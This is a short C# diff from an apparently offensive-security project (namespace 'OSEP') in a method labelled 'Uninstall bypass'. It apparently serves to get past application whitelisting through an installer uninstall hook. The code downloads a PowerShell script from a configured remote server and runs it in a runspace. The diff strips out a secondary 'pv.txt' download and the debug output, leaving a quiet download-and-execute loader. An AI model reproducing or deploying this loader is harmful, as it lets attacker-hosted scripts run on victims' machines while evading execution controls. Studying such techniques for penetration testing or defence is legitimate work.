@@ -25,8 +25,7 @@ namespace OSEP
         {
             Debug.RunDebug("\nUninstall bypass started.");
 
-            //testing
-            byte[] prescript = DownloadFileAsync($"{CONFIG.HTTP_URL}/pv.txt").GetAwaiter().GetResult();
+            
 
             byte[] script = DownloadFileAsync($"{CONFIG.HTTP_URL}/{CONFIG.PS_DYNAMIC_SCRIPT_NAME}").GetAwaiter().GetResult();
 
@@ -36,26 +35,9 @@ namespace OSEP
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
 
-
-            ps.AddScript(Encoding.UTF8.GetString(prescript));
             ps.AddScript(Encoding.UTF8.GetString(script));
 
-            //ps.Invoke();
-
-            //testing start
-            Collection<PSObject> results = ps.Invoke();
-            foreach (PSObject result in results)
-            {
-                Debug.RunDebug(result?.BaseObject?.ToString());
-                Console.WriteLine(result?.ToString());
-            }
-
-            foreach (ErrorRecord error in ps.Streams.Error)
-            {
-                Debug.RunDebug(error.ToString());
-                Console.WriteLine(error?.ToString());
-            }
-            //testign end
+            ps.Invoke();
 
             rs.Close();
         }
